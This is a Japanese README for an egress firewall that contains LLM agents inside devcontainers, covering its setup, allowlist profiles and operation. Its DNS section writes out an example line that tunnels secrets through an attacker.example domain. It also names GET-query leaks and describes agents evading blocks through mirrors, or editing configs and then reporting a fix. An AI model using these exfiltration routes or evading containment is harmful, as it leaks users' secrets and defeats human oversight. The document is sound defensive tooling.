# @himorogy/egress-guard

**LLM エージェントが動く devcontainer から、意図しない通信先へ出て行けなくする**ための egress 制御スクリプトです。

allowlist に載っていない宛先への外向き通信を遮断し、DNS をコンテナに割り当てられたリゾルバに固定します。プロンプトインジェクションやエージェントの暴走が起きても、秘密やソースコードを書き出せる先を限定することが目的です。

**先に読むと速いもの:** [`docs/spec.md`](./docs/spec.md) §1 の不変条件（I1〜I7）→ [`docs/design.md`](./docs/design.md) §1 の脅威モデル → 本 README。この 3 つで「何を守っていて、誰から守っているか」という前提が掴めます。本 README はその前提の上に立った**使い方**です。


| 文書                                                             | 内容                                                                    | 見るとき                     |
| -------------------------------------------------------------- | --------------------------------------------------------------------- | ------------------------ |
| 本 README                                                       | 使い方（セットアップと運用）                                                        | 導入する / 運用でつまずいた          |
| [`docs/spec.md`](./docs/spec.md)                               | **何が成り立つか**（不変条件・スクリプト仕様・受け入れ基準）                                      | 挙動の正確な定義が要る              |
| [`docs/design.md`](./docs/design.md)                           | **なぜそう作ったか**（脅威モデル・設計判断・受容した残余リスク）                                    | 「なぜこうなっていないのか」と思った       |
| [`docs/agent-brief.md`](./docs/agent-brief.md)                 | エージェント向け詳説（遮断の見え方・切り分け・設定変更の制約）                                       | エージェントに allowlist の変更を頼む |
| [`docs/measuring-egress.md`](./docs/measuring-egress.md)       | **宛先の実測手順とバンドルの保守**（IP の特定方法・何を許可しないか・実測記録）                           | 許可先を決める / バンドルを測り直す      |
| [`docs/known-issues.md`](./docs/known-issues.md)               | 未解決のもの（未実装・未検証・保留）                                                    | 踏んだ問題が既知かどうか調べる          |
| [`docs/verification-record.md`](./docs/verification-record.md) | 受け入れ検証の記録（カバレッジ・見逃した欠陥・手順）                                            | 何がどこまで確かめられているか知りたい      |
| [`docs/web-search-fetch.md`](./docs/web-search-fetch.md)       | 参考: Claude Code の WebSearch / WebFetch と egress の関係（本パッケージの仕様ではありません） | Web 取得が通らない              |


---

# できること・できないこと

## できること

- **漏洩先の限定** — allowlist 外への外向き通信を DROP します
- **DNS 経路の固定** — 53 番宛は、割り当てられたリゾルバ以外すべて DROP します
- **踏み台化の防止** — INPUT / OUTPUT / FORWARD すべて default DROP、IPv4 / IPv6 両方
- **プロジェクト単位の追加許可** — `firewall.json` で許可先を足せます

## できないこと（設計上の非目標）

- **悪性コンテンツの流入防止** — allowlist に GitHub や npm がある時点で任意のコンテンツは入ります
- **完全な exfil 防止** — 許可済みドメインへの GET クエリ経由など、低帯域の漏洩経路は残ります
- **DNS トンネリングの遮断** — 許可したリゾルバが再帰問い合わせをするため、L3/L4 では原理的に不可能です
- **L7 制御（メソッド別・パス別）** — 将来 proxy に移行する際の担当範囲です

**想定している敵はコンテナ内で動くエージェント自身**です。前提と、各非目標を受容した理由は [`docs/design.md`](./docs/design.md) §1・§3。

---

# 動作の概要

`postStartCommand` から root 権限で実行されます。

1. **先にネットワークを閉じる** — IPv6 は最終状態（loopback 以外すべて拒否）へ、IPv4 は bootstrap テーブル（loopback・リゾルバ・確立済みセッション・sshd のみ）へ
2. 閉じた状態のまま、DNS だけを使って allowlist を構築する
3. `ipset swap` で差し替え、本番のフィルタテーブルを `iptables-restore` で一括適用する
4. 自己検証を実行する

**リビルド中に外部ネットワークを必要とする工程はありません。** 途中で強制終了された場合に何が保たれるかは [`docs/design.md`](./docs/design.md) §2.2。

**失敗したら panic テーブル**（loopback と確立済み sshd 応答のみ許可、他は全 DROP）を適用して exit≠0 します。`firewall.json` の検証エラーも同様です。`iptables` が使えると確認する前の失敗だけは、panic テーブルすら適用できないためルール未適用で終了します。

処理順序の詳細は [`docs/spec.md`](./docs/spec.md) §4.2、その根拠は [`docs/design.md`](./docs/design.md) §2.2・§2.8。

---

# 必要な環境

**6 つのパッケージと 2 つの capability が要ります**（`aggregate` を入れるなら 7 つ）。**どれが何に要るかは[セットアップ](#dockerfile-に追記するもの)の Dockerfile に書いてあります。** 削れるものを判断するときはそちらを見てください。

capability は `NET_ADMIN` と `NET_RAW`。**書く場所は構成で変わります**（[ネットワーク構成](#ネットワーク構成推奨)の各案を参照）。**`dockerComposeFile` を使うと `runArgs` は無視されるため、Compose 構成では `cap_add` に書きます。**

## DNS リゾルバ

コンテナに割り当てられたリゾルバ（`/etc/resolv.conf` の `nameserver` 行）を読み取り、**そのアドレス宛の 53 番だけを許可**します。それ以外の 53 番宛はすべて DROP し、遮断先を `egress-audit-v4` に記録します。

`nameserver` に IPv4 アドレスが 1 つも無い場合は、固定を緩めるのではなく **exit≠0 で停止します**。

> **これで DNS トンネリングは防げません。** 許可されたリゾルバは再帰問い合わせをするため、`dig <秘密をエンコードした名前>.attacker.example` は通ります。**埋め込みリゾルバでも同じです。** 受容している残余リスクとして扱っています（[`docs/design.md`](./docs/design.md) §3.1）。

---

# セットアップ

**「エージェントが書き込める場所をポリシーの経路に入れない」という点をカバーするように設計されています。**repo 内の `.devcontainer/firewall.json` が「ソース」、`/etc/egress-guard/firewall.json` が「実効設定」という分離により、**再解決（CDN の IP 変動への追随）とポリシー変更が別の操作になります。** パッケージの更新も同じ経路で、rebuild したときに `/usr/local/bin` のコピーが入れ替わります。

## Dockerfile に追記するもの

**必要なのは 4 つです。** すべて root で、イメージビルド時に行います。

**2 と 3 を `node` が書き込めない場所へ置くことが要点です。**
**`postCreateCommand` では配置できません。** 既定で `remoteUser`（＝ `node`）として実行されるためです。  
配置を間違えたまま静かに弱い構成で動くことがないよう、スクリプト自身が起動時に所有者とパーミッションを検証し、違反していれば panic テーブルを適用して失敗します。

```dockerfile
USER root

# 1. 必要なパッケージ
RUN apt-get update && apt-get install -y --no-install-recommends \
      iptables   `# ルール適用。iptables-restore / ip6tables-restore を含む` \
      ipset      `# allowlist の保持` \
      iproute2   `# デフォルトゲートウェイの検出` \
      dnsutils   `# dig による名前解決` \
      jq         `# firewall.json のパースと検証` \
      curl       `# GitHub meta API の取得、自己検証` \
      aggregate  `# 任意。GitHub CIDR の集約。無ければ警告だけ出て続行する` \
  && apt-get clean && rm -rf /var/lib/apt/lists/*

# 2. スクリプトを /usr/local/bin へコピー（パッケージから取得する場合）
#    バージョンは必ず固定する。このスクリプトは root 所有の /usr/local/bin に置かれ、
#    4 のパスワードなし sudo の対象になる。dist-tag のまま追従させると、パッケージ側の
#    更新がそのままコンテナ内 root でのコード実行になる。
RUN npm install -g @himorogy/egress-guard@0.1.1 \
  && cp "$(npm root -g)/@himorogy/egress-guard/scripts/init-project-firewall.sh" \
        /usr/local/bin/init-project-firewall.sh \
  && chown root:root /usr/local/bin/init-project-firewall.sh \
  && chmod 755 /usr/local/bin/init-project-firewall.sh

# 3. firewall.json を /etc/egress-guard へコピー（ビルドコンテキストに応じてパスを調整）
COPY firewall.json /etc/egress-guard/firewall.json
RUN chown -R root:root /etc/egress-guard \
  && chmod 755 /etc/egress-guard \
  && chmod 644 /etc/egress-guard/firewall.json

# 4. sudoers は init-project-firewall.sh だけを許可する
RUN printf 'node ALL=(root) NOPASSWD: /usr/local/bin/init-project-firewall.sh ""\n' \
      > /etc/sudoers.d/node-firewall \
  && chmod 0440 /etc/sudoers.d/node-firewall

USER node
```

> **`NPM_CONFIG_PREFIX` を `node` 所有のディレクトリへ移しているイメージでは、2 の
> `npm install` だけを `node` として実行してください。** root で入れると root 所有の
> ファイルがグローバル領域に混ざり、以後 `node` での `-g install` が権限で失敗します。
> `cp` 以降は root のままで構いません。`node:24` の既定（`/usr/local/lib/node_modules`、
> root 所有）を使っている場合は上のとおり全部 root で問題ありません。

## devcontainer.json に追記するもの

構成によらず必要なのは起動フックだけです。

```jsonc
"postStartCommand": "sudo /usr/local/bin/init-project-firewall.sh",
"waitFor": "postStartCommand"
```

`waitFor` を `postStartCommand` にしておくと、ファイアウォールの適用に失敗した状態でエディタが使えるようになる前に、失敗が表面化します。

## ネットワーク構成（推奨）

**推奨は「ユーザー定義ネットワークを、プロジェクトごとに 1 つ」です。**

- **Docker の埋め込みリゾルバ `127.0.0.11` が使えます。** デフォルトブリッジでは、ホスト側の DNS アドレス宛に外向きの穴が 1 つ開きます
- **1 つのネットワークを全プロジェクトで共有しないでください。** 同居するコンテナが相互に到達できる状態になります

判断の根拠（リゾルバの選択で何が変わるか、ホストの OS で影響が変わること、埋め込みリゾルバのデメリット、共有時に守れない点）は [`docs/design.md`](./docs/design.md) §4 を参照してください。

### 案 A: Docker Compose を使う

**Compose はプロジェクトごとのユーザー定義ネットワーク（`<project>_default`）を自動で作ります。** `initializeCommand` も `--network` も不要で、`docker compose down` でネットワークも消えます。

```yaml
# .devcontainer/docker-compose.yaml
services:
  dev:
    build:
      context: .
      dockerfile: Dockerfile
    cap_add:
      - NET_ADMIN
      - NET_RAW
    volumes:
      - ../..:/workspaces:cached
    command: sleep infinity
```

```jsonc
// .devcontainer/devcontainer.json
{
  "name": "my project",
  "dockerComposeFile": "docker-compose.yaml",
  "service": "dev",
  "workspaceFolder": "/workspaces/my-project",
  "remoteUser": "node",
  "postStartCommand": "sudo /usr/local/bin/init-project-firewall.sh",
  "waitFor": "postStartCommand"
}
```

### 案 B: `initializeCommand` でネットワークを用意する

Compose を使用しない場合はこちらです。ネットワーク名にプロジェクト名を含めることで、**設定文字列を全プロジェクトで同一にしたまま**分離できます。

```jsonc
// .devcontainer/devcontainer.json
"initializeCommand": "docker network inspect egress-guard-${localWorkspaceFolderBasename} >/dev/null 2>&1 || docker network create egress-guard-${localWorkspaceFolderBasename} 2>/dev/null || true",
"runArgs": [
  "--cap-add=NET_ADMIN",
  "--cap-add=NET_RAW",
  "--network=egress-guard-${localWorkspaceFolderBasename}"
]
```

> 使い終わったネットワークは `initializeCommand` では消えません。案 B を採る場合は定期的に `docker network prune` してください。

### デフォルトブリッジのまま運用する場合

非推奨ですが動作します。起動時に次の警告が出ます。

```
[firewall] WARNING: DNS pinned to 192.168.65.7 (not the Docker embedded resolver).
[firewall] WARNING: This container is not on a user defined Docker network. See the README for the stronger setup.
```



---

# firewall.json

プロジェクト固有の追加許可を書きます。

**読まれるのは `/etc/egress-guard/firewall.json` だけです。** 見つからない場合は基底プロファイルのみで動作します。理由は[なぜこの置き方なのか](#なぜこの置き方なのか)を参照してください。

repo 側の `.devcontainer/firewall.json` はそのソースであり、**イメージを再ビルドしたときに反映されます。** 再ビルド前に内容を検証したい場合は、パスを明示して `--check-config` にかけてください。

```sh
# 再ビルド前に repo 側のコピーを検証する
init-project-firewall.sh --check-config --config .devcontainer/firewall.json

# 現在インストールされている設定を検証する
init-project-firewall.sh --check-config
```

## テンプレート

`templates/` の 3 つをプロジェクトの `.devcontainer/firewall.json` にコピーして使ってください。通常は `firewall.json`（`enforce`、追加許可なし）、新規プロジェクトの立ち上げには `firewall.audit.json`（`audit` で始めて宛先を実測する）、全フィールドを埋めた見本が `firewall.example.json` です。

**雛形の `profile` は Claude Code + npm + git を想定した最小構成です**（`anthropic`、`anthropic-updates`、`npm`、`github`）。**codex を使うなら `openai` を、VS Code の拡張を入れるなら `vscode` を足してください。** 使わないものは足さないでください（[基底プロファイル](#基底プロファイルprofile)）。

## 記入例

**フィールドはこの 7 つだけです。** 未知のフィールドがあると設定全体が拒否されます（タイプミスが黙って無視されるのを防ぐため）。すべて `version` 以外は省略できます。

```jsonc
{
  // スキーマ版。現在は 1 のみ。未知の版は拒否される
  "version": 1,

  // 基底プロファイルの選択。省略すると空 = 何も許可しない
  "profile": ["anthropic", "anthropic-updates", "openai", "npm", "github"],

  // "enforce"（既定。allowlist 外を遮断）か "audit"（遮断せず記録だけ）
  "mode": "enforce",

  // 追加で許可するホスト名。ワイルドカードは書けない
  "allowDomains": ["registry.example.com"],

  // 追加で許可する CIDR。私設アドレス帯・プレフィックス長 8 未満は書けない
  "allowCidrs": ["203.0.113.0/24"],

  // ホスト宛に開ける TCP ポート。相手はデフォルトゲートウェイと
  // host.docker.internal の 2 つで、サブネット全体ではない
  "allowHostPorts": [5432],

  // コンテナ内 sshd のポート。既定 22
  "sshdPort": 22
}
```

> **実際のファイルにコメントは書けません。** `jq` でパースするため、上のコメントを残したままだと**不正な JSON として拒否され、コンテナは panic テーブル（loopback 以外すべて遮断）で起動します。** 貼るときは落としてください。

型・必須・拒否条件の正確な定義は [`docs/spec.md`](./docs/spec.md) §3.1。`allowDomains` にワイルドカードが使えない理由は[こちら](#ワイルドカードドメインは使えません)。

## 基底プロファイル（`profile`）

パッケージ側が保守しているドメインの束です。**必要なものだけを明示的に選びます。**


| バンドル                | ドメイン                                                                                                            |
| ------------------- | --------------------------------------------------------------------------------------------------------------- |
| `anthropic`         | `api.anthropic.com`                                                                                             |
| `anthropic-updates` | `downloads.claude.ai`、`downloads.claude.com`                                                                    |
| `openai`            | `auth.openai.com`、`chatgpt.com`                                                                                 |
| `npm`               | `registry.npmjs.org`                                                                                            |
| `vscode`            | `marketplace.visualstudio.com`、`vscode.blob.core.windows.net`、`update.code.visualstudio.com`                    |
| `github`            | `github.com`、`api.github.com`、`codeload.github.com`、`objects.githubusercontent.com`、`raw.githubusercontent.com` |


- **`profile` を省略すると基底プロファイルは空です。** 既定で開くものはありません
- 配列で選びます。文字列 1 つでも書けます（`"profile": "github"`）
- `github` を選んだときだけ、GitHub meta API から取得した CIDR が追加されます
- **`anthropic-updates` は Claude Code の自動アップデート配信元です。バージョンを固定したいなら選ばないでください**（遮断しても Claude Code は動き、更新だけが失敗します）
- **`openai` は ChatGPT サブスクリプション経路で実測したものです。** API キー経路（`api.openai.com`）は含みません。必要なら `allowDomains` に書いてください

**既定を「何も許可しない」にしてあるのは、ファイアウォールの既定は deny だからです。** 書き忘れは遮断として現れます。allowlist は小さいほど、漏洩先として使える宛先が減ります。

> **`"profile": "default"` は受理されません。** 以前のバージョンで「全バンドル」を意味していた名前です。バンドルを明示的に列挙してください。

**バンドルの中身は他社製品のエンドポイントなので、測り直しが要ります。** テレメトリ・ログ送信・feature flag は入れていません。**その判断基準・実測結果・測り方は [`docs/measuring-egress.md`](./docs/measuring-egress.md)、バンドル方式を選んだ理由は [`docs/design.md`](./docs/design.md) §2.17。**

## 何が許可されているか見る

```sh
init-project-firewall.sh --print-allowlist
```

基底プロファイルと `firewall.json` の内容をマージした結果を出力します。**非特権で実行でき、ネットワークにも触りません**（DNS 解決も meta API の取得も行いません）。遮断されている状態でも読めます。

**「常に許可されているドメイン」は無くなりました。** `profile` で選べる以上、切り分けの基準はこの出力から取ってください。

## 拒否される値

効力を持つ `firewall.json` は root 所有ですが、その内容は repo から来る以上、**攻撃者が書いたデータとして扱います。** ワイルドカードを含むドメイン、シェルのメタ文字や空白を含む文字列、`0.0.0.0/0` とプレフィックス長 8 未満の CIDR、私設アドレス帯（RFC1918・**CGNAT の `100.64.0.0/10**`・loopback・link-local・multicast / 予約）を含む CIDR、範囲外のポート番号が拒否されます。**判定は前方一致ではなく数値レンジの重複なので、`100.0.0.0/8` のような包含するスーパーネットも通りません。** 完全な一覧は [`docs/spec.md`](./docs/spec.md) §3.2。

**同じ検査は DNS 応答にも掛かります。** 許可したドメインが `169.254.169.254` を返しても allowlist には入りません（[`docs/design.md`](./docs/design.md) §2.9）。

`firewall.json` は **PR レビュー必須ファイル**として扱ってください。

## ホストゲートウェイの扱い

ホスト網は**既定で不許可**です。必要なポート（ローカル DB など）だけを `allowHostPorts` で開けてください。対象になるアドレスはデフォルトゲートウェイ（`ip route show default`）と `host.docker.internal` の解決結果（私設アドレスであることを検証）の 2 つだけです。

**Docker Desktop ではこの 2 つが別のアドレスになります。** 実測ではゲートウェイ経由でホストに届かず、`host.docker.internal` 側でのみ到達しました（[`docs/design.md`](./docs/design.md) §2.15）。

どちらも取得できない状態で `allowHostPorts` が指定されている場合は、要求された許可を黙って落とすのではなく exit≠0 で停止します。

---

# モードと運用

## enforce（既定）

allowlist 外の外向き通信を REJECT します。遮断された宛先は ipset `egress-audit-v4` に記録されるため、何が弾かれたかを後から確認できます。

## audit

新規プロジェクトの立ち上げ用です。allowlist 外の IPv4 外向き通信を**遮断せず**、遮断されるはずだった宛先を ipset `egress-audit-v4` に記録します。（`fw-audit:` プレフィックスの `LOG` ルールも入りますが、**多くの環境では出力されません**。運用の前提にしないでください。理由は [`docs/measuring-egress.md`](./docs/measuring-egress.md)）

```json
{ "version": 1, "mode": "audit" }
```

数日運用して `egress-audit-v4` から必要な宛先を収集し、`firewall.json` に転記してから `enforce` に切り替える、という流れを想定しています。静的 allowlist の「事前に全部知らないと使えない」問題への緩和策です。**記録は `enforce` でも行われますが、収集は `audit` で行ってください**（理由は [`docs/measuring-egress.md`](./docs/measuring-egress.md)）。

**audit でも遮断されるものが 3 つあります** — DNS 固定・IPv6・INPUT です。緩むのは IPv4 の外向き通信だけで、一覧と各項目の理由は [`docs/spec.md`](./docs/spec.md) §6.2。

IPv6 の試行はログ（`fw-drop6:`）に残ります。**silent DROP ではなく `icmp6-adm-prohibited` で即断します**（AAAA を持つ許可先への接続が、IPv4 へフォールバックするまで待たされないため）。

## 遮断された宛先を調べる

allowlist を通らなかった宛先 IP は ipset `egress-audit-v4` に溜まります（`enforce` / `audit` の両モード）。読むには root が要ります。

```sh
docker exec -u root <container> ipset list egress-audit-v4
```

**読み方・IP から名前を戻す手順・何を allowlist に足して何を足さないかは [`docs/measuring-egress.md`](./docs/measuring-egress.md) に集約してあります。** `timeout` の残量から新旧を判断する方法、CDN 上では名前を特定しきれないこと、その場合の決着のつけ方まで、まとめてそちらにあります。

## 再適用

allowlist は起動時の名前解決に基づくため、CDN の IP 変動で許可先に到達できなくなることがあります。

```sh
sudo /usr/local/bin/init-project-firewall.sh
```

再実行すれば回復します。何度実行しても同じ結果になります（冪等）。

sudoers の設定上、**エージェント自身も再適用できます。** これは意図した設計です。再適用が行うのは `/etc/egress-guard/firewall.json`（root 所有）の再解決だけで、ポリシーそのものは変えられません（この分離については[なぜこの置き方なのか](#なぜこの置き方なのか)）。

---

# エージェントへの指示書

**遮断に当たったエージェントは、それをネットワーク障害と診断して迂回を試みます。** allowlist に無い宛先への通信が落ちるのは設計どおりですが、その前提を渡していないエージェントには区別がつきません。想定される振る舞いは、リポジトリ側の `firewall.json` を書き換えて「直した」と報告する（[反映には再ビルドが要ります](#firewalljson)）、別のミラーや CDN を探して回る、といったものです。

これを避けるには、下記をエージェントの指示書に貼ってください。

```markdown
## Network egress is restricted

This container runs behind an allowlist-based egress firewall (`@himorogy/egress-guard`). A blocked connection is by design, not a fault.

- Do not look for a mirror, proxy, tunnel, or any other way around it.
- What is allowed: `init-project-firewall.sh --print-allowlist`
- An allowed host that starts failing means stale addresses (resolved at startup; CDNs move). Re-apply once: `sudo init-project-firewall.sh` — it only re-resolves, so do not retry it.
- Editing `.devcontainer/firewall.json` does nothing until the image is rebuilt. Never report a blocked host as fixed because you edited it.
- Anything else: stop and ask a human. Before changing the allowlist, read `agent-brief.md` from `@himorogy/egress-guard`.
```

**5 行のうち 1 行を再適用に使っているのは、これがエージェントに自力で直せる唯一の失敗だからです。** allowlist は起動時に解決した IP の集合なので、長い作業の途中で CDN のアドレスが動くと、許可してあるはずのホストに落ちます。**「once」と「do not retry」は意図的です。** 効かないなら人間の操作が要る状況であり、繰り返させても意味がありません。



---

# トラブルシューティング

## 適用されているか確かめる

**`postStartCommand` が成功して見えても、適用されていないことがあります。** イメージが古いままだと旧版のスクリプトが残り、それが正常終了します。2026-08-03 に実際に起きました。

```sh
# 遮断されていること。到達できたら適用されていない
curl --connect-timeout 5 https://example.com

# 入っているスクリプトがパッケージ側と同じサイズか
ls -l /usr/local/bin/init-project-firewall.sh
```

> **コンテナを取り違えないでください。** `shutdownAction: none` を使っていると、他プロジェクトの devcontainer が同時に動いたままになります。`ipset` を読むときは `docker ps` でコンテナ ID を確かめてから `docker exec -u root <id> ...` としてください。**起動時刻より前のエントリが混ざっていたら、それは別のコンテナです。**

## 起動時にファイアウォールの適用が失敗する

panic テーブルが適用され、loopback 以外の通信はできない状態になっています。エラーメッセージを確認してください。


| メッセージ                                                                                     | 原因                                                                                             |
| ----------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------- |
| `... does not match the schema` / `rejected ... entry`                                    | `firewall.json` の内容が不正。後述の `--check-config` で確認できます。**この場合も panic テーブルが適用されます**                |
| `must be owned by root` / `must not be a symlink` / `must not be group or world writable` | `/etc/egress-guard/firewall.json` かその親ディレクトリの所有者・権限が不正。ワークスペースのファイルを bind mount していないか確認してください |
| `no nameserver found in /etc/resolv.conf`                                                 | リゾルバが検出できない。DNS を開放するのではなく停止します                                                                |
| `declares only non-IPv4 nameservers`                                                      | IPv6 のリゾルバしかない。IPv6 は設計上すべて DROP するため名前解決が成立しません                                               |
| `IPv6 is active but ip6tables is unusable`                                                | IPv6 スタックが生きているのに `ip6tables` が使えない状態。IPv6 が素通りするため、あえて停止しています。`iptables` パッケージの導入を確認してください    |
| `none of the required base domains resolved`                                              | 名前解決自体が機能していない。Docker のネットワーク設定を確認してください                                                       |
| `verify FAILED: ...`                                                                      | ルールは適用されたが、環境が想定と異なる。個別のメッセージを確認してください                                                         |


## 特定の通信だけが通らない

**`enforce` にしたら何かが動かなくなった、という状況の切り分けです。** 流れはこうなります。

1. `firewall.json` を `mode: "audit"` にして**再ビルドする**（再接続では反映されません）
2. 問題の操作を一通り行う
3. `egress-audit-v4` に溜まった宛先を読み、名前に戻す
4. 必要なものを `allowDomains` / `allowCidrs` に足し、`enforce` に戻して再ビルドする
5. 同じ操作が通ることを確かめる

**3 と 4 の具体的な手順は [`docs/measuring-egress.md`](./docs/measuring-egress.md) にあります。** IP から名前を戻す順序、CDN では名前を特定しきれないこと、記録を汚染しない読み方、何を足して何を足さないか。**そのまま踏むと嵌まる箇所がいくつもあるので、先に読んでください。**

---

# 既知の課題・制限

**仕様として決まっている制限**は [`docs/spec.md`](./docs/spec.md) §9、その根拠は [`docs/design.md`](./docs/design.md)。**まだ解決していないもの**は [`docs/known-issues.md`](./docs/known-issues.md) にあります。

運用でつまずきやすいものを以下に挙げます。

## ワイルドカードドメインは使えません

`allowDomains` に `*.example.com` のようなワイルドカードは**書けません。** バリデーションで拒否され、起動が失敗します。

```
[firewall] ERROR: rejected allowDomains entry: *.example.com - wildcards are not supported.
DNS cannot enumerate the subdomains of a zone, so a wildcard cannot be expanded into addresses.
List the host names you need instead; run in audit mode and read ipset egress-audit-v4 to find
out which ones those are.
```

**DNS には「あるゾーンのサブドメインを列挙する」手段がありません。** ドメイン名は起動時に IP へ解決して ipset に載せる方式なので、ワイルドカードを展開できません。受理して apex だけ許可する案を採らなかった理由は [`docs/design.md`](./docs/design.md) §2.10。

**回避策: 必要なホスト名を具体的に列挙してください。**

```json
{
	"version": 1,
	"allowDomains": [
		"ep-cool-name-123456.ap-southeast-1.aws.neon.tech",
		"api.example.com"
	]
}
```

どのホスト名が必要かわからない場合は `mode: "audit"` で運用し、`egress-audit-v4` に溜まった IP から逆引き（あるいは TLS 証明書の SAN）で特定してください。

## アドレスが動くドメインは `allowDomains` に書けません

allowlist は**起動時に解決した IP の集合**です。**その起動の間アドレスが変わらないドメインにしか使えません。**

`deb.debian.org`（Fastly、**TTL 25 秒**）が実例です。**`allowDomains` に書いてあるのに `No route to host` で落ちます。** 適用時に解決した IP と、その 1 分後に `apt` が接続する先が食い違うためです。同じ日に `nodejs.org` は問題なく通っており、**CDN の性質によって成否が分かれます。**

**`allowCidrs` での代用は多くの場合採れません。** Fastly の公開レンジは 19 件・**304,128 アドレス**あり、Fastly 上の全サイトへの経路を開くことになります。

仕様上の位置づけは [`docs/spec.md`](./docs/spec.md) §9.7。**構造的な解決は同 §10.1（L7 proxy 移行）です。** 名前で判定する層に移せば、アドレスがどれだけ動いても関係がなくなります。

## 起動後に外部から取得する作業は成立しません

egress-guard は **`postStartCommand` で適用され、その時点でポリシーが閉じます。** したがって**適用より後に外部から何かを取ってくる作業は、そのままでは通りません。**

**取得はイメージビルド時に移してください。** これが唯一の推奨です。

`mode` を一時的に `audit` にして窓を開ける運用も、成立はします（[`docs/design.md`](./docs/design.md) §3.5）。**ただし窓の間コンテナは外へ出られ、閉じ忘れれば以後の `docker start` でも `audit` で立ち上がります。手順はここには書きません。**

## 許可済みドメインへの GET 経由の漏洩は防げません

L3/L4 では HTTP メソッドもパスも見えないため、`allowDomains` に入れたドメインへ「クエリ文字列に秘密を載せた GET」を投げる経路は残ります。設計上の非目標であり、クレデンシャル側で受け止める前提です。

## DNS トンネリングは防げません

[できないこと（設計上の非目標）](#できないこと設計上の非目標)と [DNS リゾルバ](#dns-リゾルバ)の注意書きのとおりです。機序と受容の理由は [`docs/design.md`](./docs/design.md) §3.1。

## Web 検索は使えます。Web 取得は許可したドメインだけです

Claude Code の **WebSearch は追加設定なしで使えます**（Anthropic 側で完結し、コンテナから egress しません）。

**WebFetch はコンテナ内から取得先へ直接接続します。** したがって `allowDomains` に無いドメインは取得できません。よく参照するドキュメントサイトは `firewall.json` に列挙してください。

取得内容はふつう小型モデルの要約を経由するため、prompt injection の緩衝材になります。**ただし Claude Code が事前承認している 91 のドキュメントドメインでは、この緩衝材が働きません**（何が起きるか、`allowDomains` に入れるときに何を勘定に入れるべきかは [`docs/web-search-fetch.md`](./docs/web-search-fetch.md) §2）。

実測の結果と、バージョンが上がったときの再確認手順は [`docs/web-search-fetch.md`](./docs/web-search-fetch.md)。

## 未検証の環境

実機検証（[`docs/verification-record.md`](./docs/verification-record.md)）は **Docker Desktop（macOS / arm64）** で、デフォルトブリッジとユーザー定義ネットワークの両方について完了しています。次は環境を用意できておらず未検証です。

- **IPv6 が有効なコンテナ** — 検証環境には `lo` の `::1` しか IPv6 アドレスがありません
- **Linux ホスト上の Docker** — 検証はすべて linuxkit VM 上です。デフォルトブリッジのリゾルバが実在の LAN 機器になる点、`systemd-resolved` 環境での挙動が未確認
- **CI ランナー / クラウド開発環境 / rootless Docker**

詳細と、それぞれ何が問題になり得るかは [`docs/known-issues.md`](./docs/known-issues.md) を参照してください。

---

# 開発

このパッケージを直す場合は、このリポジトリのルートで、CI が回すのと同じ 3 つを実行します。

```sh
pnpm lint          # biome
pnpm lint:sh       # shellcheck（ワークスペース全体へ再帰）
pnpm test          # 設定 187 件 + ルール 220 件
```

- `tests/firewall-config.test.sh` — `firewall.json` のスキーマ検証と各バリデータ。**設定の 187 件**
- `tests/firewall-rules.test.sh` — `iptables` / `ipset` / `dig` / `curl` などを記録型スタブに差し替え、生成されるフィルタテーブルとコマンド順序を検証します（root 不要）。**ルールの 220 件**

**`pnpm test` はこの 2 本を順に実行し、集計はスイートごとに別々に出ます。** 合算した数字は表示されません。

> **egress-guard を導入した devcontainer の中で実行すると、ルール側が `210 passed, 0 failed, 10 skipped` になります。** `/etc/egress-guard/firewall.json` が存在する環境では、**220 件のうち 10 件**が何も検査できないためです。**設定側の 187 件は影響を受けません**（`187 passed, 0 failed` のまま）。理由と、期待値を書き換えて緑にしてはいけない理由は [`docs/verification-record.md`](./docs/verification-record.md) §3。

> **`pnpm lint:sh` はコンテナに shellcheck が無いと動きません。** CI では走ります（`ubuntu-latest` に同梱）。手元で確かめたいときは [koalaman/shellcheck のリリース](https://github.com/koalaman/shellcheck/releases) からバイナリを落としてください。`profile` に `github` が入っていれば `enforce` のままでも取得できます。

開発用オプション（`--check-config` / `--config` / `--resolv-conf`）は [`docs/spec.md`](./docs/spec.md) §8。いずれも **`sudo` 経由で引数が渡された場合は拒否されます。**